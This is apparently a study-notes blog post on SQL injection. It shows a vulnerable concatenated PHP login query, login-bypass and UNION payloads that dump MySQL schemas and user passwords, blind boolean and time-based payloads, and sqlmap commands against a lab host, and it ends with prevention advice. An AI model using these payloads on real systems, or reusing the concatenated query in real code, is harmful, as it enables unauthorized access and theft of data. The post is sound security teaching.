---
title: "SQL Injection Fundamentals: UNION, Blind and Automation with sqlmap"
date: 2026-11-15 20:30:00 +0530
categories: [CPTS, Web]
tags: [sqli, web, mysql, sqlmap]
description: How SQL injection works, how to confirm it, extract data with UNION queries, handle blind cases, and when to let sqlmap do the heavy lifting.
---

> *One unescaped quote.* SQL injection happens when user input is concatenated straight into a query. It is old, well understood and still everywhere.

## How It Works

Imagine a login query built by string concatenation:

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "' AND password = '" . $_POST['pass'] . "'";
```

If the attacker submits `admin'-- -` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username = 'admin'-- -' AND password = '...'
```

Everything after `-- -` is a comment, so the password check disappears.

## Confirming the Injection

Try a single quote first and watch for errors or changed behaviour:

| Payload     | What it tells you                          |
| ----------- | ------------------------------------------ |
| `'`         | Syntax error means input reaches the query |
| `' OR 1=1-- -` | Always true, may bypass a login or list every row |
| `' AND 1=2-- -` | Always false, compare against the true case |

## UNION-Based Extraction

A `UNION` lets you append your own `SELECT` to the original query. Two rules: the **column count** and the **data types** must match.

### 1. Find the number of columns

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   -- error here means the query has 2 columns
```

### 2. Find which columns are reflected

```sql
' UNION SELECT 1,2,3-- -
```

### 3. Pull data (MySQL)

```sql
-- version and current user
' UNION SELECT 1,@@version,user()-- -

-- list databases
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -

-- list tables in a database
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='app'-- -

-- list columns
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -

-- dump data
' UNION SELECT 1,username,password FROM app.users-- -
```

## Blind SQL Injection

When nothing is reflected on the page you need to infer data from behaviour.

**Boolean-based:** the page changes depending on whether a condition is true.

```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
```

**Time-based:** the response is delayed when the condition is true.

```sql
' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0)-- -
```

Doing this by hand is slow, which is exactly what automation is for.

## Automating with sqlmap

```bash
# basic test, list databases
sqlmap -u "http://target.htb/item.php?id=1" --batch --dbs

# dump one table
sqlmap -u "http://target.htb/item.php?id=1" -D app -T users --dump --batch

# POST request saved from Burp
sqlmap -r request.txt --batch --level 3 --risk 2
```

> Save the raw request from Burp and use `-r request.txt`. It keeps cookies, headers and POST bodies exactly as the app expects them.
{: .tip }

## Prevention

- Use **parameterized queries** (prepared statements) everywhere
- Apply least privilege to the database account
- Validate input, but never rely on validation alone
- Don't show raw database errors to users
